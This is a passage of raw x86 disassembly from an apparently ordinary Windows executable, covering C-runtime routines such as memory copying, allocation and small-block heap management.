  4262a0:	mov    al,BYTE PTR [esi+0x3]
  4262a3:	and    edx,ecx
  4262a5:	mov    BYTE PTR [edi+0x3],al
  4262a8:	mov    al,BYTE PTR [esi+0x2]
  4262ab:	shr    ecx,0x2
  4262ae:	mov    BYTE PTR [edi+0x2],al
  4262b1:	sub    esi,0x2
  4262b4:	sub    edi,0x2
  4262b7:	cmp    ecx,0x8
  4262ba:	jb     0x426244
  4262bc:	std    
  4262bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262bf:	cld    
  4262c0:	jmp    DWORD PTR [edx*4+0x426368]
  4262c7:	nop
  4262c8:	mov    al,BYTE PTR [esi+0x3]
  4262cb:	and    edx,ecx
  4262cd:	mov    BYTE PTR [edi+0x3],al
  4262d0:	mov    al,BYTE PTR [esi+0x2]
  4262d3:	mov    BYTE PTR [edi+0x2],al
  4262d6:	mov    al,BYTE PTR [esi+0x1]
  4262d9:	shr    ecx,0x2
  4262dc:	mov    BYTE PTR [edi+0x1],al
  4262df:	sub    esi,0x3
  4262e2:	sub    edi,0x3
  4262e5:	cmp    ecx,0x8
  4262e8:	jb     0x426244
  4262ee:	std    
  4262ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f1:	cld    
  4262f2:	jmp    DWORD PTR [edx*4+0x426368]
  4262f9:	lea    ecx,[ecx+0x0]
  4262fc:	sbb    al,0x63
  4262fe:	inc    edx
  4262ff:	add    BYTE PTR [ebx+eiz*2],ah
  426302:	inc    edx
  426303:	add    BYTE PTR [ebx+eiz*2],ch
  426306:	inc    edx
  426307:	add    BYTE PTR [ebx+eiz*2],dh
  42630a:	inc    edx
  42630b:	add    BYTE PTR [ebx+eiz*2],bh
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2+0x42],al
  426313:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  426317:	add    BYTE PTR [edi+0x63],bl
  42631a:	inc    edx
  42631b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426321:	inc    esp
  426322:	(bad)  
  426323:	sbb    al,0x8b
  426325:	inc    esp
  426326:	mov    ds,WORD PTR [eax]
  426328:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42632c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426330:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426334:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426338:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426340:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426348:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426350:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426354:	lea    eax,[ecx*4+0x0]
  42635b:	add    esi,eax
  42635d:	add    edi,eax
  42635f:	jmp    DWORD PTR [edx*4+0x426368]
  426366:	mov    edi,edi
  426368:	js     0x4263cd
  42636a:	inc    edx
  42636b:	add    BYTE PTR [eax-0x6fffbd9d],al
  426371:	arpl   WORD PTR [edx+0x0],ax
  426374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426375:	arpl   WORD PTR [edx+0x0],ax
  426378:	mov    eax,DWORD PTR [ebp+0x8]
  42637b:	pop    esi
  42637c:	pop    edi
  42637d:	leave  
  42637e:	ret    
  42637f:	nop
  426380:	mov    al,BYTE PTR [esi+0x3]
  426383:	mov    BYTE PTR [edi+0x3],al
  426386:	mov    eax,DWORD PTR [ebp+0x8]
  426389:	pop    esi
  42638a:	pop    edi
  42638b:	leave  
  42638c:	ret    
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    al,BYTE PTR [esi+0x2]
  426399:	mov    BYTE PTR [edi+0x2],al
  42639c:	mov    eax,DWORD PTR [ebp+0x8]
  42639f:	pop    esi
  4263a0:	pop    edi
  4263a1:	leave  
  4263a2:	ret    
  4263a3:	nop
  4263a4:	mov    al,BYTE PTR [esi+0x3]
  4263a7:	mov    BYTE PTR [edi+0x3],al
  4263aa:	mov    al,BYTE PTR [esi+0x2]
  4263ad:	mov    BYTE PTR [edi+0x2],al
  4263b0:	mov    al,BYTE PTR [esi+0x1]
  4263b3:	mov    BYTE PTR [edi+0x1],al
  4263b6:	mov    eax,DWORD PTR [ebp+0x8]
  4263b9:	pop    esi
  4263ba:	pop    edi
  4263bb:	leave  
  4263bc:	ret    
  4263bd:	push   DWORD PTR [esp+0x4]
  4263c1:	call   DWORD PTR ds:0x4290c8
  4263c7:	xor    eax,eax
  4263c9:	inc    eax
  4263ca:	ret    0x8
  4263cd:	push   0x10
  4263cf:	push   0x4296c8
  4263d4:	call   0x425340
  4263d9:	mov    eax,ds:0x45dd88
  4263de:	test   eax,eax
  4263e0:	jne    0x426419
  4263e2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263e9:	je     0x42640f
  4263eb:	push   0x4296b4
  4263f0:	call   DWORD PTR ds:0x429024
  4263f6:	test   eax,eax
  4263f8:	je     0x42640f
  4263fa:	push   0x42968c
  4263ff:	push   eax
  426400:	call   DWORD PTR ds:0x429020
  426406:	mov    ds:0x45dd88,eax
  42640b:	test   eax,eax
  42640d:	jne    0x426419
  42640f:	mov    eax,0x4263bd
  426414:	mov    ds:0x45dd88,eax
  426419:	and    DWORD PTR [ebp-0x4],0x0
  42641d:	push   DWORD PTR [ebp+0xc]
  426420:	push   DWORD PTR [ebp+0x8]
  426423:	call   eax
  426425:	mov    DWORD PTR [ebp-0x1c],eax
  426428:	jmp    0x42644e
  42642a:	mov    eax,DWORD PTR [ebp-0x14]
  42642d:	mov    eax,DWORD PTR [eax]
  42642f:	mov    eax,DWORD PTR [eax]
  426431:	mov    DWORD PTR [ebp-0x20],eax
  426434:	xor    eax,eax
  426436:	inc    eax
  426437:	ret    
  426438:	mov    esp,DWORD PTR [ebp-0x18]
  42643b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426442:	jne    0x42644c
  426444:	push   0x8
  426446:	call   DWORD PTR ds:0x429094
  42644c:	xor    eax,eax
  42644e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426452:	call   0x42537b
  426457:	ret    
  426458:	push   0x10
  42645a:	push   0x4296d8
  42645f:	call   0x425340
  426464:	mov    esi,DWORD PTR [ebp+0x8]
  426467:	imul   esi,DWORD PTR [ebp+0xc]
  42646b:	mov    DWORD PTR [ebp-0x1c],esi
  42646e:	test   esi,esi
  426470:	jne    0x426473
  426472:	inc    esi
  426473:	xor    edi,edi
  426475:	mov    DWORD PTR [ebp-0x20],edi
  426478:	cmp    esi,0xffffffe0
  42647b:	ja     0x4264e2
  42647d:	cmp    DWORD PTR ds:0x45e144,0x3
  426484:	jne    0x4264cd
  426486:	add    esi,0xf
  426489:	and    esi,0xfffffff0
  42648c:	mov    DWORD PTR [ebp+0xc],esi
  42648f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426492:	cmp    ebx,DWORD PTR ds:0x45df04
  426498:	ja     0x4264cd
  42649a:	push   0x4
  42649c:	call   0x4254ff
  4264a1:	pop    ecx
  4264a2:	and    DWORD PTR [ebp-0x4],edi
  4264a5:	push   ebx
  4264a6:	call   0x426f01
  4264ab:	pop    ecx
  4264ac:	mov    DWORD PTR [ebp-0x20],eax
  4264af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264b3:	call   0x426502
  4264b8:	mov    edi,DWORD PTR [ebp-0x20]
  4264bb:	test   edi,edi
  4264bd:	je     0x4264d1
  4264bf:	push   DWORD PTR [ebp-0x1c]
  4264c2:	push   0x0
  4264c4:	push   edi
  4264c5:	call   0x427c40
  4264ca:	add    esp,0xc
  4264cd:	test   edi,edi
  4264cf:	jne    0x42650b
  4264d1:	push   esi
  4264d2:	push   0x8
  4264d4:	push   DWORD PTR ds:0x45e140
  4264da:	call   DWORD PTR ds:0x429030
  4264e0:	mov    edi,eax
  4264e2:	test   edi,edi
  4264e4:	jne    0x42650b
  4264e6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264ec:	je     0x42650b
  4264ee:	push   esi
  4264ef:	call   0x427c22
  4264f4:	pop    ecx
  4264f5:	test   eax,eax
  4264f7:	jne    0x426473
  4264fd:	jmp    0x42650d
  4264ff:	mov    esi,DWORD PTR [ebp+0xc]
  426502:	push   0x4
  426504:	call   0x42546b
  426509:	pop    ecx
  42650a:	ret    
  42650b:	mov    eax,edi
  42650d:	call   0x42537b
  426512:	ret    
  426513:	push   esi
  426514:	mov    esi,DWORD PTR [esp+0x8]
  426518:	mov    eax,DWORD PTR [esi+0x3c]
  42651b:	push   edi
  42651c:	xor    edi,edi
  42651e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426524:	je     0x426589
  426526:	cmp    eax,edi
  426528:	je     0x426589
  42652a:	mov    eax,DWORD PTR [esi+0x2c]
  42652d:	cmp    DWORD PTR [eax],edi
  42652f:	jne    0x426589
  426531:	mov    eax,DWORD PTR [esi+0x34]
  426534:	cmp    eax,edi
  426536:	je     0x426554
  426538:	cmp    DWORD PTR [eax],edi
  42653a:	jne    0x426554
  42653c:	cmp    eax,DWORD PTR ds:0x45def0
  426542:	je     0x426554
  426544:	push   eax
  426545:	call   0x425f4a
  42654a:	push   DWORD PTR [esi+0x3c]
  42654d:	call   0x427e8f
  426552:	pop    ecx
  426553:	pop    ecx
  426554:	mov    eax,DWORD PTR [esi+0x30]
  426557:	cmp    eax,edi
  426559:	je     0x426577
  42655b:	cmp    DWORD PTR [eax],edi
  42655d:	jne    0x426577
  42655f:	cmp    eax,DWORD PTR ds:0x45def4
  426565:	je     0x426577
  426567:	push   eax
  426568:	call   0x425f4a
  42656d:	push   DWORD PTR [esi+0x3c]
  426570:	call   0x427e30
  426575:	pop    ecx
  426576:	pop    ecx
  426577:	push   DWORD PTR [esi+0x2c]
  42657a:	call   0x425f4a
  42657f:	push   DWORD PTR [esi+0x3c]
  426582:	call   0x425f4a
  426587:	pop    ecx
  426588:	pop    ecx
  426589:	mov    eax,DWORD PTR [esi+0x40]
  42658c:	cmp    eax,DWORD PTR ds:0x45deec
  426592:	je     0x4265ac
  426594:	cmp    eax,edi
  426596:	je     0x4265ac
  426598:	cmp    DWORD PTR [eax],edi
  42659a:	jne    0x4265ac
  42659c:	push   eax
  42659d:	call   0x425f4a
  4265a2:	push   DWORD PTR [esi+0x44]
  4265a5:	call   0x425f4a
  4265aa:	pop    ecx
  4265ab:	pop    ecx
  4265ac:	mov    eax,DWORD PTR [esi+0x50]
  4265af:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265b5:	je     0x4265d3
  4265b7:	cmp    eax,edi
  4265b9:	je     0x4265d3
  4265bb:	cmp    DWORD PTR [eax+0xb4],edi
  4265c1:	jne    0x4265d3
  4265c3:	push   eax
  4265c4:	call   0x427ca0
  4265c9:	push   DWORD PTR [esi+0x50]
  4265cc:	call   0x425f4a
  4265d1:	pop    ecx
  4265d2:	pop    ecx
  4265d3:	push   esi
  4265d4:	call   0x425f4a
  4265d9:	pop    ecx
  4265da:	pop    edi
  4265db:	pop    esi
  4265dc:	ret    
  4265dd:	push   esi
  4265de:	call   0x4251f3
  4265e3:	mov    esi,eax
  4265e5:	mov    eax,DWORD PTR [esi+0x64]
  4265e8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265ee:	je     0x42669a
  4265f4:	test   eax,eax
  4265f6:	je     0x426627
  4265f8:	mov    ecx,DWORD PTR [eax+0x2c]
  4265fb:	dec    DWORD PTR [eax]
  4265fd:	test   ecx,ecx
  4265ff:	je     0x426603
  426601:	dec    DWORD PTR [ecx]
  426603:	mov    ecx,DWORD PTR [eax+0x34]
  426606:	test   ecx,ecx
  426608:	je     0x42660c
  42660a:	dec    DWORD PTR [ecx]
  42660c:	mov    ecx,DWORD PTR [eax+0x30]
  42660f:	test   ecx,ecx
  426611:	je     0x426615
  426613:	dec    DWORD PTR [ecx]
  426615:	mov    ecx,DWORD PTR [eax+0x40]
  426618:	test   ecx,ecx
  42661a:	je     0x42661e
  42661c:	dec    DWORD PTR [ecx]
  42661e:	mov    ecx,DWORD PTR [eax+0x4c]
  426621:	dec    DWORD PTR [ecx+0xb4]
  426627:	mov    ecx,DWORD PTR ds:0x45d58c
  42662d:	mov    DWORD PTR [esi+0x64],ecx
  426630:	mov    ecx,DWORD PTR ds:0x45d58c
  426636:	inc    DWORD PTR [ecx]
  426638:	mov    ecx,DWORD PTR ds:0x45d58c
  42663e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426641:	test   ecx,ecx
  426643:	je     0x426647
  426645:	inc    DWORD PTR [ecx]
  426647:	mov    ecx,DWORD PTR ds:0x45d58c
  42664d:	mov    ecx,DWORD PTR [ecx+0x34]
  426650:	test   ecx,ecx
  426652:	je     0x426656
  426654:	inc    DWORD PTR [ecx]
  426656:	mov    ecx,DWORD PTR ds:0x45d58c
  42665c:	mov    ecx,DWORD PTR [ecx+0x30]
  42665f:	test   ecx,ecx
  426661:	je     0x426665
  426663:	inc    DWORD PTR [ecx]
  426665:	mov    ecx,DWORD PTR ds:0x45d58c
  42666b:	mov    ecx,DWORD PTR [ecx+0x40]
  42666e:	test   ecx,ecx
  426670:	je     0x426674
  426672:	inc    DWORD PTR [ecx]
  426674:	mov    ecx,DWORD PTR ds:0x45d58c
  42667a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42667d:	inc    DWORD PTR [ecx+0xb4]
  426683:	test   eax,eax
  426685:	je     0x42669a
  426687:	cmp    DWORD PTR [eax],0x0
  42668a:	jne    0x42669a
  42668c:	cmp    eax,0x45d538
  426691:	je     0x42669a
  426693:	push   eax
  426694:	call   0x426513
  426699:	pop    ecx
  42669a:	mov    eax,DWORD PTR [esi+0x64]
  42669d:	pop    esi
  42669e:	ret    
  42669f:	push   0xc
  4266a1:	push   0x429868
  4266a6:	call   0x425340
  4266ab:	push   0xc
  4266ad:	call   0x4254ff
  4266b2:	pop    ecx
  4266b3:	and    DWORD PTR [ebp-0x4],0x0
  4266b7:	call   0x4265dd
  4266bc:	mov    DWORD PTR [ebp-0x1c],eax
  4266bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266c3:	call   0x4266d1
  4266c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266cb:	call   0x42537b
  4266d0:	ret    
  4266d1:	push   0xc
  4266d3:	call   0x42546b
  4266d8:	pop    ecx
  4266d9:	ret    
  4266da:	push   0x140
  4266df:	push   0x0
  4266e1:	push   DWORD PTR ds:0x45e140
  4266e7:	call   DWORD PTR ds:0x429030
  4266ed:	test   eax,eax
  4266ef:	mov    ds:0x45df00,eax
  4266f4:	jne    0x4266f7
  4266f6:	ret    
  4266f7:	mov    ecx,DWORD PTR [esp+0x4]
  4266fb:	and    DWORD PTR ds:0x45def8,0x0
  426702:	and    DWORD PTR ds:0x45defc,0x0
  426709:	mov    ds:0x45df08,eax
  42670e:	xor    eax,eax
  426710:	mov    DWORD PTR ds:0x45df04,ecx
  426716:	mov    DWORD PTR ds:0x45df0c,0x10
  426720:	inc    eax
  426721:	ret    
  426722:	mov    eax,ds:0x45defc
  426727:	lea    ecx,[eax+eax*4]
  42672a:	mov    eax,ds:0x45df00
  42672f:	lea    ecx,[eax+ecx*4]
  426732:	jmp    0x426746
  426734:	mov    edx,DWORD PTR [esp+0x4]
  426738:	sub    edx,DWORD PTR [eax+0xc]
  42673b:	cmp    edx,0x100000
  426741:	jb     0x42674c
  426743:	add    eax,0x14
  426746:	cmp    eax,ecx
  426748:	jb     0x426734
  42674a:	xor    eax,eax
  42674c:	ret    
  42674d:	push   ebp
  42674e:	mov    ebp,esp
  426750:	sub    esp,0x10
  426753:	mov    ecx,DWORD PTR [ebp+0x8]
  426756:	mov    eax,DWORD PTR [ecx+0x10]
  426759:	push   esi
  42675a:	mov    esi,DWORD PTR [ebp+0xc]
  42675d:	push   edi
  42675e:	mov    edi,esi
  426760:	sub    edi,DWORD PTR [ecx+0xc]
  426763:	add    esi,0xfffffffc
  426766:	shr    edi,0xf
  426769:	mov    ecx,edi
  42676b:	imul   ecx,ecx,0x204
  426771:	lea    ecx,[ecx+eax*1+0x144]
  426778:	mov    DWORD PTR [ebp-0x10],ecx
  42677b:	mov    ecx,DWORD PTR [esi]
  42677d:	dec    ecx
  42677e:	test   cl,0x1
  426781:	mov    DWORD PTR [ebp-0x4],ecx
  426784:	jne    0x426a61
  42678a:	push   ebx
  42678b:	lea    ebx,[ecx+esi*1]
  42678e:	mov    edx,DWORD PTR [ebx]
  426790:	mov    DWORD PTR [ebp-0xc],edx
  426793:	mov    edx,DWORD PTR [esi-0x4]
  426796:	mov    DWORD PTR [ebp-0x8],edx
  426799:	mov    edx,DWORD PTR [ebp-0xc]
  42679c:	test   dl,0x1
  42679f:	mov    DWORD PTR [ebp+0xc],ebx
  4267a2:	jne    0x426818
  4267a4:	sar    edx,0x4
  4267a7:	dec    edx
  4267a8:	cmp    edx,0x3f
  4267ab:	jbe    0x4267b0
  4267ad:	push   0x3f
  4267af:	pop    edx
  4267b0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267b3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267b6:	jne    0x4267fa
  4267b8:	cmp    edx,0x20
  4267bb:	mov    ebx,0x80000000
  4267c0:	jae    0x4267db
  4267c2:	mov    ecx,edx
  4267c4:	shr    ebx,cl
  4267c6:	lea    ecx,[edx+eax*1+0x4]
  4267ca:	not    ebx
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267d0:	dec    BYTE PTR [ecx]
  4267d2:	jne    0x4267f7
  4267d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d7:	and    DWORD PTR [ecx],ebx
  4267d9:	jmp    0x4267f7
  4267db:	lea    ecx,[edx-0x20]
  4267de:	shr    ebx,cl
  4267e0:	lea    ecx,[edx+eax*1+0x4]
  4267e4:	not    ebx
  4267e6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267ed:	dec    BYTE PTR [ecx]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],ebx
  4267f7:	mov    ebx,DWORD PTR [ebp+0xc]
  4267fa:	mov    edx,DWORD PTR [ebx+0x8]
  4267fd:	mov    ebx,DWORD PTR [ebx+0x4]
  426800:	mov    ecx,DWORD PTR [ebp-0x4]
  426803:	add    ecx,DWORD PTR [ebp-0xc]
  426806:	mov    DWORD PTR [edx+0x4],ebx
  426809:	mov    edx,DWORD PTR [ebp+0xc]
  42680c:	mov    ebx,DWORD PTR [edx+0x4]
  42680f:	mov    edx,DWORD PTR [edx+0x8]
  426812:	mov    DWORD PTR [ebx+0x8],edx
  426815:	mov    DWORD PTR [ebp-0x4],ecx
  426818:	mov    edx,ecx
  42681a:	sar    edx,0x4
  42681d:	dec    edx
  42681e:	cmp    edx,0x3f
  426821:	jbe    0x426826
  426823:	push   0x3f
  426825:	pop    edx
  426826:	mov    ebx,DWORD PTR [ebp-0x8]
  426829:	and    ebx,0x1
  42682c:	mov    DWORD PTR [ebp-0xc],ebx
  42682f:	jne    0x4268c4
  426835:	sub    esi,DWORD PTR [ebp-0x8]
  426838:	mov    ebx,DWORD PTR [ebp-0x8]
  42683b:	sar    ebx,0x4
  42683e:	push   0x3f
  426840:	mov    DWORD PTR [ebp+0xc],esi
  426843:	dec    ebx
  426844:	pop    esi
  426845:	cmp    ebx,esi
  426847:	jbe    0x42684b
  426849:	mov    ebx,esi
  42684b:	add    ecx,DWORD PTR [ebp-0x8]
  42684e:	mov    edx,ecx
  426850:	sar    edx,0x4
  426853:	dec    edx
  426854:	cmp    edx,esi
  426856:	mov    DWORD PTR [ebp-0x4],ecx
  426859:	jbe    0x42685d
  42685b:	mov    edx,esi
  42685d:	cmp    ebx,edx
  42685f:	je     0x4268bf
  426861:	mov    ecx,DWORD PTR [ebp+0xc]
  426864:	mov    esi,DWORD PTR [ecx+0x4]
  426867:	cmp    esi,DWORD PTR [ecx+0x8]
  42686a:	jne    0x4268a7
  42686c:	cmp    ebx,0x20
  42686f:	mov    esi,0x80000000
  426874:	jae    0x42688d
  426876:	mov    ecx,ebx
  426878:	shr    esi,cl
  42687a:	not    esi
  42687c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426880:	dec    BYTE PTR [ebx+eax*1+0x4]
  426884:	jne    0x4268a7
  426886:	mov    ecx,DWORD PTR [ebp+0x8]
  426889:	and    DWORD PTR [ecx],esi
  42688b:	jmp    0x4268a7
  42688d:	lea    ecx,[ebx-0x20]
  426890:	shr    esi,cl
  426892:	not    esi
  426894:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42689b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42689f:	jne    0x4268a7
  4268a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268a4:	and    DWORD PTR [ecx+0x4],esi
  4268a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268aa:	mov    esi,DWORD PTR [ecx+0x8]
  4268ad:	mov    ecx,DWORD PTR [ecx+0x4]
  4268b0:	mov    DWORD PTR [esi+0x4],ecx
  4268b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268b6:	mov    esi,DWORD PTR [ecx+0x4]
  4268b9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268bc:	mov    DWORD PTR [esi+0x8],ecx
  4268bf:	mov    esi,DWORD PTR [ebp+0xc]
  4268c2:	jmp    0x4268c7
  4268c4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268c7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268cb:	jne    0x4268d5
  4268cd:	cmp    ebx,edx
  4268cf:	je     0x426955
  4268d5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268d8:	lea    ecx,[ecx+edx*8]
  4268db:	mov    ebx,DWORD PTR [ecx+0x4]
  4268de:	mov    DWORD PTR [esi+0x8],ecx
  4268e1:	mov    DWORD PTR [esi+0x4],ebx
  4268e4:	mov    DWORD PTR [ecx+0x4],esi
  4268e7:	mov    ecx,DWORD PTR [esi+0x4]
  4268ea:	mov    DWORD PTR [ecx+0x8],esi
  4268ed:	mov    ecx,DWORD PTR [esi+0x4]
  4268f0:	cmp    ecx,DWORD PTR [esi+0x8]
  4268f3:	jne    0x426955
  4268f5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4268f9:	mov    BYTE PTR [ebp+0xf],cl
  4268fc:	inc    cl
  4268fe:	cmp    edx,0x20
  426901:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426905:	jae    0x42692c
  426907:	cmp    BYTE PTR [ebp+0xf],0x0
  42690b:	jne    0x42691b
  42690d:	mov    ecx,edx
  42690f:	mov    ebx,0x80000000
  426914:	shr    ebx,cl
  426916:	mov    ecx,DWORD PTR [ebp+0x8]
  426919:	or     DWORD PTR [ecx],ebx
  42691b:	mov    ebx,0x80000000
  426920:	mov    ecx,edx
  426922:	shr    ebx,cl
  426924:	lea    eax,[eax+edi*4+0x44]
  426928:	or     DWORD PTR [eax],ebx
  42692a:	jmp    0x426955
  42692c:	cmp    BYTE PTR [ebp+0xf],0x0
  426930:	jne    0x426942
  426932:	lea    ecx,[edx-0x20]
  426935:	mov    ebx,0x80000000
  42693a:	shr    ebx,cl
  42693c:	mov    ecx,DWORD PTR [ebp+0x8]
  42693f:	or     DWORD PTR [ecx+0x4],ebx
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    edx,0x80000000
  42694a:	shr    edx,cl
  42694c:	lea    eax,[eax+edi*4+0xc4]
  426953:	or     DWORD PTR [eax],edx
  426955:	mov    eax,DWORD PTR [ebp-0x4]
  426958:	mov    DWORD PTR [esi],eax
  42695a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42695e:	mov    eax,DWORD PTR [ebp-0x10]
  426961:	dec    DWORD PTR [eax]
  426963:	jne    0x426a60
  426969:	mov    eax,ds:0x45def8
  42696e:	test   eax,eax
  426970:	je     0x426a52
  426976:	mov    ecx,DWORD PTR ds:0x45df10
  42697c:	mov    esi,DWORD PTR ds:0x4290ac
  426982:	push   0x4000
  426987:	shl    ecx,0xf
  42698a:	add    ecx,DWORD PTR [eax+0xc]
  42698d:	mov    ebx,0x8000
  426992:	push   ebx
  426993:	push   ecx
  426994:	call   esi
  426996:	mov    ecx,DWORD PTR ds:0x45df10
  42699c:	mov    eax,ds:0x45def8
  4269a1:	mov    edx,0x80000000
  4269a6:	shr    edx,cl
  4269a8:	or     DWORD PTR [eax+0x8],edx
  4269ab:	mov    eax,ds:0x45def8
  4269b0:	mov    eax,DWORD PTR [eax+0x10]
  4269b3:	mov    ecx,DWORD PTR ds:0x45df10
  4269b9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269c1:	mov    eax,ds:0x45def8
  4269c6:	mov    eax,DWORD PTR [eax+0x10]
  4269c9:	dec    BYTE PTR [eax+0x43]
  4269cc:	mov    eax,ds:0x45def8
  4269d1:	mov    ecx,DWORD PTR [eax+0x10]
  4269d4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269d8:	jne    0x4269e3
  4269da:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269de:	mov    eax,ds:0x45def8
  4269e3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269e7:	jne    0x426a52
  4269e9:	push   ebx
  4269ea:	push   0x0
  4269ec:	push   DWORD PTR [eax+0xc]
  4269ef:	call   esi
  4269f1:	mov    eax,ds:0x45def8
  4269f6:	push   DWORD PTR [eax+0x10]
  4269f9:	push   0x0
  4269fb:	push   DWORD PTR ds:0x45e140
  426a01:	call   DWORD PTR ds:0x42902c
  426a07:	mov    eax,ds:0x45defc
  426a0c:	mov    edx,DWORD PTR ds:0x45df00
  426a12:	lea    eax,[eax+eax*4]
  426a15:	shl    eax,0x2
  426a18:	mov    ecx,eax
  426a1a:	mov    eax,ds:0x45def8
  426a1f:	sub    ecx,eax
  426a21:	lea    ecx,[ecx+edx*1-0x14]
  426a25:	push   ecx
  426a26:	lea    ecx,[eax+0x14]
  426a29:	push   ecx
  426a2a:	push   eax
  426a2b:	call   0x428280
  426a30:	mov    eax,DWORD PTR [ebp+0x8]
  426a33:	add    esp,0xc
  426a36:	dec    DWORD PTR ds:0x45defc
  426a3c:	cmp    eax,DWORD PTR ds:0x45def8
  426a42:	jbe    0x426a48
  426a44:	sub    DWORD PTR [ebp+0x8],0x14
  426a48:	mov    eax,ds:0x45df00
  426a4d:	mov    ds:0x45df08,eax
  426a52:	mov    eax,DWORD PTR [ebp+0x8]
  426a55:	mov    ds:0x45def8,eax
  426a5a:	mov    DWORD PTR ds:0x45df10,edi
  426a60:	pop    ebx
  426a61:	pop    edi
  426a62:	pop    esi
  426a63:	leave  
  426a64:	ret    
  426a65:	mov    eax,ds:0x45defc
  426a6a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a70:	push   edi
  426a71:	xor    edi,edi
  426a73:	cmp    eax,ecx
  426a75:	jne    0x426aab
  426a77:	lea    eax,[ecx+ecx*4+0x50]
  426a7b:	shl    eax,0x2
  426a7e:	push   eax
  426a7f:	push   DWORD PTR ds:0x45df00
  426a85:	push   edi
  426a86:	push   DWORD PTR ds:0x45e140
  426a8c:	call   DWORD PTR ds:0x4290d0
  426a92:	cmp    eax,edi
  426a94:	jne    0x426a9a
  426a96:	xor    eax,eax
  426a98:	pop    edi
  426a99:	ret    
  426a9a:	add    DWORD PTR ds:0x45df0c,0x10
  426aa1:	mov    ds:0x45df00,eax
  426aa6:	mov    eax,ds:0x45defc
  426aab:	mov    ecx,DWORD PTR ds:0x45df00
  426ab1:	push   esi
  426ab2:	push   0x41c4
  426ab7:	push   0x8
  426ab9:	push   DWORD PTR ds:0x45e140
  426abf:	lea    eax,[eax+eax*4]
  426ac2:	lea    esi,[ecx+eax*4]
  426ac5:	call   DWORD PTR ds:0x429030
  426acb:	cmp    eax,edi
  426acd:	mov    DWORD PTR [esi+0x10],eax
  426ad0:	jne    0x426ad6
  426ad2:	xor    eax,eax
  426ad4:	jmp    0x426b19
  426ad6:	push   0x4
  426ad8:	push   0x2000
  426add:	push   0x100000
  426ae2:	push   edi
  426ae3:	call   DWORD PTR ds:0x4290cc
  426ae9:	cmp    eax,edi
  426aeb:	mov    DWORD PTR [esi+0xc],eax
  426aee:	jne    0x426b02
  426af0:	push   DWORD PTR [esi+0x10]
  426af3:	push   edi
  426af4:	push   DWORD PTR ds:0x45e140
  426afa:	call   DWORD PTR ds:0x42902c
  426b00:	jmp    0x426ad2
  426b02:	or     DWORD PTR [esi+0x8],0xffffffff
  426b06:	mov    DWORD PTR [esi],edi
  426b08:	mov    DWORD PTR [esi+0x4],edi
  426b0b:	inc    DWORD PTR ds:0x45defc
  426b11:	mov    eax,DWORD PTR [esi+0x10]
  426b14:	or     DWORD PTR [eax],0xffffffff
  426b17:	mov    eax,esi
  426b19:	pop    esi
  426b1a:	pop    edi
  426b1b:	ret    
  426b1c:	push   ebp
  426b1d:	mov    ebp,esp
  426b1f:	push   ecx
  426b20:	push   ecx
  426b21:	mov    ecx,DWORD PTR [ebp+0x8]
  426b24:	mov    eax,DWORD PTR [ecx+0x8]
  426b27:	push   ebx
  426b28:	push   esi
  426b29:	mov    esi,DWORD PTR [ecx+0x10]
  426b2c:	push   edi
  426b2d:	xor    ebx,ebx
  426b2f:	jmp    0x426b34
  426b31:	shl    eax,1
  426b33:	inc    ebx
  426b34:	test   eax,eax
  426b36:	jge    0x426b31
  426b38:	mov    eax,ebx
